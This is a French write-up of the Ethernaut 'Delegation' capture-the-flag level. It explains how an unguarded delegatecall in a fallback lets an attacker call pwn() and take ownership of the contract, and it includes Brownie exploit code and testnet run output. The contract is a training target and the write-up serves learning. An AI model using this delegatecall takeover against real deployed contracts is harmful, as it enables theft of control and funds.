# Delegation

## Objectif
L'objectif de ce challenge est de devenir le owner du contrat.

## Devenir owner du contrat

A première lecture, il n'est pas possible de devenir owner du contrat en appellant seulement une méthode du contrat.

Nous pouvons voir que la méthode [`fallback`](./contracts/delegation.sol#27) effectue un [`delegatecall`](./contracts/delegation.sol#28) sur le contract `Delegate` qui contient la méthode [`pwn`](./contracts/delegation.sol#12)

Cette méthode `pwn` permet de modifier la variable `owner` par `msg.sender`

Lorsqu'un contrat A fait un appel à `delegatecall` sur le contrat B, **le code du contrat B** est exécuté avec **le contexte du contrat A**

Nous pouvons ainsi devenir owner du contrat `Delegation` en réussissant à appeller la méthode `pwn` du contrat `Delegate`

Pour pouvoir appeller la méthode `pwn` via le `delegatecall`, nous devons utiliser le *sélecteur* de la méthode `pwn`: il s'agit des 4 premiers octets du `hash` de la signature de la méthode:
```python
web3.keccak(text='pwn()')[0:4]
```

Une méthode pour faire cet appel est d'utiliser `transfer` avec la `payload` en tant que paramètre `data`:
```python
hacker.transfer(to=delegation.address, data=web3.keccak(text='pwn()')[0:4])
```

Une alternative est d'utiliser `Contract.from_abi`:
```python
target = Contract.from_abi("Delegate", delegation.address, Delegate.abi)
target.pwn({'from': hacker})
```

## Exécution du script d'attaque
Afin de pouvoir agir sur la chaine `rinkeby`, il est nécessaire de créer un fichier `.env` contenant la clé de projet [Infura](https://infura.io/) et la valeur de la clé privée du compte utilisé pour le challenge:
```shell
export WEB3_INFURA_PROJECT_ID='AABBCCDD.......'
export PRIVATE_KEY='0xDEADBEEFCACA...'
```

En utilisant la console sur le site d'[ethernaut openzeppelin](https://ethernaut.openzeppelin.com/level/0x9451961b7Aea1Df57bc20CC68D72f662241b5493) on récupère l'adresse du contrat déployé pour lancer l'attaque ainsi:
```bash
$ brownie run scripts/attack.py main "0xf59942b26B2F967EE34A148d99dC128192555129" --network rinkeby
```
```console
Brownie v1.18.1 - Python development framework for Ethereum

DelegationProject is the active project.

Running 'scripts/attack.py::main'...
Transaction sent: 0xa66ccb484dcee1249ca7d76a2f699342f25758cfa4cc17c22d3fea3a33d9c018
  Gas price: 1.000000017 gwei   Gas limit: 32843   Nonce: 229
  Transaction confirmed   Block: 10378179   Gas used: 31288 (95.27%)
```
